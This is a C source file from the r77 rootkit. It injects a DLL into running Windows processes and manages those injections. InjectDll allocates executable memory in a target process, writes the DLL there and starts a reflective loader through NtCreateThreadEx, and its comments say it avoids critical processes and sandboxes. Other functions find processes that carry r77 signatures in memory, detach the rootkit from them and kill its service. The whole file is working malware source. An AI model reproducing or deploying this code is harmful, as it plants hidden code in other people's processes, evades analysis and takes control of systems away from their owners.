#include "r77process.h"
#include "r77def.h"
#include "r77win.h"
#include <Shlwapi.h>
#include <Psapi.h>

BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize)
{
	BOOL result = FALSE;

	// The bitness of the process must match the bitness of the DLL, otherwise the process will crash.
	BOOL isProcess64Bit, isDll64Bit;
	if (Is64BitProcess(processId, &isProcess64Bit) && IsExecutable64Bit(dll, &isDll64Bit) && isProcess64Bit == isDll64Bit)
	{
		HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, processId);
		if (process)
		{
			// Check, if the executable name is on the exclusion list (see: PROCESS_EXCLUSIONS)
			BOOL processExcluded = FALSE;
			WCHAR processName[MAX_PATH + 1];
			if (GetProcessFileName(processId, FALSE, processName, MAX_PATH))
			{
				LPCWSTR exclusions[] = PROCESS_EXCLUSIONS;
				for (int i = 0; i < sizeof(exclusions) / sizeof(LPCWSTR); i++)
				{
					if (!StrCmpIW(processName, exclusions[i]))
					{
						processExcluded = TRUE;
						break;
					}
				}
			}

			if (!processExcluded)
			{
				// Do not inject critical processes (smss, csrss, wininit, etc.).
				ULONG breakOnTermination;
				if (NT_SUCCESS(NtQueryInformationProcess(process, ProcessBreakOnTermination, &breakOnTermination, sizeof(ULONG), NULL)) && !breakOnTermination)
				{
					// Sandboxes tend to crash when injecting shellcode. Only inject medium IL and above.
					DWORD integrityLevel;
					if (GetProcessIntegrityLevel(process, &integrityLevel) && integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID)
					{
						// Get function pointer to the shellcode that loads the DLL reflectively.
						DWORD entryPoint = GetExecutableFunction(dll, "ReflectiveDllMain");
						if (entryPoint)
						{
							LPBYTE allocatedMemory = (LPBYTE)VirtualAllocEx(process, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
							if (allocatedMemory)
							{
								if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
								{
									HANDLE thread = NULL;
									if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
									{
										if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
										{
											// Return TRUE, only if DllMain returned TRUE.
											// DllMain returns FALSE, for example, if r77 is already injected.
											DWORD exitCode;
											if (GetExitCodeThread(thread, &exitCode))
											{
												result = exitCode != 0;
											}

											// The reflective loader will no longer need the DLL file.
											if (!VirtualFreeEx(process, allocatedMemory, 0, MEM_RELEASE))
											{
												result = FALSE;
											}
										}

										CloseHandle(thread);
									}
								}
							}
						}
					}
				}
			}

			CloseHandle(process);
		}
	}

	return result;
}

BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
{
	BOOL result = TRUE;
	DWORD actualCount = 0;

	LPDWORD processes = NEW_ARRAY(DWORD, 10000);
	DWORD processCount = 0;
	HMODULE *modules = NEW_ARRAY(HMODULE, 10000);
	DWORD moduleCount = 0;
	BYTE moduleBytes[512];

	if (EnumProcesses(processes, 10000 * sizeof(DWORD), &processCount))
	{
		processCount /= sizeof(DWORD);

		for (DWORD i = 0; i < processCount; i++)
		{
			HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
			if (process)
			{
				if (EnumProcessModulesEx(process, modules, 10000 * sizeof(HMODULE), &moduleCount, LIST_MODULES_ALL))
				{
					moduleCount /= sizeof(HMODULE);

					for (DWORD j = 0; j < moduleCount; j++)
					{
						if (ReadProcessMemory(process, (LPBYTE)modules[j], moduleBytes, 512, NULL))
						{
							WORD signature = *(LPWORD)&moduleBytes[sizeof(IMAGE_DOS_HEADER)];
							if (signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE || signature == R77_HELPER_SIGNATURE)
							{
								if (actualCount < *count)
								{
									r77Processes[actualCount].ProcessId = processes[i];
									r77Processes[actualCount].Signature = signature;
									r77Processes[actualCount++].DetachAddress = signature == R77_SIGNATURE ? *(DWORD64*)&moduleBytes[sizeof(IMAGE_DOS_HEADER) + 2] : 0;
								}
								else
								{
									result = FALSE;
								}

								break;
							}
						}
					}
				}

				CloseHandle(process);
			}
		}
	}

	FREE(processes);
	FREE(modules);

	*count = actualCount;
	return result;
}
BOOL DetachInjectedProcess(PR77_PROCESS r77Process)
{
	BOOL result = FALSE;

	if (r77Process->Signature == R77_SIGNATURE)
	{
		HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, r77Process->ProcessId);
		if (process)
		{
			// R77_PROCESS.DetachAddress is a function pointer to DetachRootkit()
			HANDLE thread = NULL;
			if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPVOID)r77Process->DetachAddress, NULL, 0, 0, 0, 0, NULL)) && thread)
			{
				result = TRUE;
				CloseHandle(thread);
			}

			CloseHandle(process);
		}
	}

	return result;
}
BOOL DetachInjectedProcessById(DWORD processId)
{
	BOOL result = FALSE;
	PR77_PROCESS r77Processes = NEW_ARRAY(R77_PROCESS, 1000);
	DWORD r77ProcessCount = 1000;

	if (GetR77Processes(r77Processes, &r77ProcessCount))
	{
		for (DWORD i = 0; i < r77ProcessCount; i++)
		{
			if (r77Processes[i].Signature == R77_SIGNATURE && r77Processes[i].ProcessId == processId)
			{
				result = DetachInjectedProcess(&r77Processes[i]);
				break;
			}
		}
	}

	FREE(r77Processes);
	return result;
}
VOID DetachAllInjectedProcesses()
{
	PR77_PROCESS r77Processes = NEW_ARRAY(R77_PROCESS, 1000);
	DWORD r77ProcessCount = 1000;

	if (GetR77Processes(r77Processes, &r77ProcessCount))
	{
		for (DWORD i = 0; i < r77ProcessCount; i++)
		{
			if (r77Processes[i].Signature == R77_SIGNATURE)
			{
				DetachInjectedProcess(&r77Processes[i]);
			}
		}
	}

	FREE(r77Processes);
}
VOID TerminateR77Service(DWORD excludedProcessId)
{
	PR77_PROCESS r77Processes = NEW_ARRAY(R77_PROCESS, 1000);
	DWORD r77ProcessCount = 1000;
	if (GetR77Processes(r77Processes, &r77ProcessCount))
	{
		for (DWORD i = 0; i < r77ProcessCount; i++)
		{
			if (r77Processes[i].Signature == R77_SERVICE_SIGNATURE && r77Processes[i].ProcessId != excludedProcessId)
			{
				HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, r77Processes[i].ProcessId);
				if (process)
				{
					TerminateProcess(process, 0);
					CloseHandle(process);
				}
			}
		}
	}

	FREE(r77Processes);
}